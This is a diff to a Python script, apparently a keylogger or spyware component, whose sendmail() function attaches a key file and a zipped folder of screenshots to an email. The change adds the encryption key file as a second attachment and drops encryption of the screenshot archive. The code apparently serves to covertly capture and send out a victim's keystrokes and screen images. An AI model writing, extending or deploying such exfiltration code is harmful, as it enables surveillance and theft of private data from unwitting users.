@@ -13,7 +13,7 @@ import PrintScreen
 
 path = os.path.dirname(os.path.abspath(__file__))
 script_path_key = os.path.join(path, 'key.txt')
-
+script_path_encryptkey = os.path.join(path, 'encryptkey.txt')
 
 def sendmail():
     Encryption.crypt_file(script_path_key)
@@ -26,6 +26,8 @@ def sendmail():
     msg = MIMEMultipart()
 
     msg.attach(MIMEText(body, 'plain'))
+
+    #załączanie pliku key
     file = script_path_key
     with open(file, "rb") as attachment:
         part = MIMEBase("application", "octet-stream")
@@ -35,10 +37,19 @@ def sendmail():
     part.add_header("Content-Disposition", f"attachment; filename={file}")
     msg.attach(part)
 
+    #załącznik z kluczem
+    file1 = script_path_encryptkey
+    with open(file1, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", f"attachment; filename={file1}")
+    msg.attach(part)
+
     shutil.make_archive("screens", 'zip', "screens")
     zip_path = os.path.join(path, 'screens.zip')
 
-    Encryption.crypt_file(zip_path)
     with open(zip_path, "rb") as file:
         attachment = MIMEBase('application', 'zip')
         attachment.set_payload(file.read())
